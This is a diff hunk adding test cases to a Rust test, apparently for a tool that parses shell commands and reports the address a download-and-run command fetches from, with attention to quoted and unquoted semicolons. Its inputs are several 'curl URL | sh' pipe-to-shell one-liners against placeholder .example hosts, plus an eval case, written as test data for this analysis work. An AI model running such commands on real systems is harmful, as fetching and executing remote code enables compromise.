@@ -256,6 +256,24 @@ fn a_fetch_is_named_by_what_the_line_runs() {
             "curl --referer https://referer.example/a https://thirteen.example/x | sh",
             "thirteen.example",
         ),
+        // A separator inside quotes is an argument, not the start of
+        // another command: the shell hands the whole thing to curl, and
+        // reading it as a separator gives two different payloads one
+        // address, one sentence and one decision.
+        (
+            "curl 'https://fourteen.example/p;v=1' | sh",
+            "fourteen.example/p;v=1",
+        ),
+        (
+            "curl 'https://fourteen.example/p;v=2' | sh",
+            "fourteen.example/p;v=2",
+        ),
+        // And unquoted it really is a separator, so the address ends where
+        // the shell says it ends.
+        (
+            "curl https://fifteen.example/p;v=1 | sh",
+            "fifteen.example/p",
+        ),
         // An argument that closes a bracket of its own.
         ("eval(load(config) + \"ten\")", "ten"),
         ("eval(load(config) + \"eleven\")", "eleven"),
